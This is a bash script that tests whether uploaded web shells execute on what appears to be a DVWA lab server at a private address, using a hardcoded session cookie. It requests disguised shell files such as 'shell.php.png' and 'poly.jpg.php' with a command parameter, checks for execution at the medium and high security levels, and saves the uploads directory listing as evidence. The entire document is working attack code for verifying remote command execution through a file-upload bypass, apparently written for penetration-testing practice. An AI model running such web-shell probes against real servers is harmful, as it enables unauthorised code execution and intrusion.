CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000'
mkdir -p evidence/upload

# test execution of previously uploaded files at medium
for FN in "poly.jpg.php" "shell.php.png" "aegis_shell.php" "shell.phtml"; do
  R=$(curl -s -b "$CK; security=medium" "$BASE/hackable/uploads/$FN?c=echo+POLYEXEC" -w '\nHTTP:%{http_code}' )
  printf 'medium GET %s => %s\n' "$FN" "$(printf '%s' "$R" | tail -1)"
done
# check execution via high
for FN in "shell.php.png"; do
  R=$(curl -s -b "$CK; security=high" "$BASE/hackable/uploads/$FN?c=echo+POLYEXEC" -w '\nHTTP:%{http_code}')
  printf 'high  GET %s => %s\n' "$FN" "$(printf '%s' "$R" | tail -1)"
done
# list uploads directory
curl -s -b "$CK; security=high" "$BASE/hackable/uploads/" -o evidence/upload/uploads_dir_listing.html
printf '%s' "$(cat evidence/upload/uploads_dir_listing.html)" | grep -oE 'href="[^"]+"' | head -40
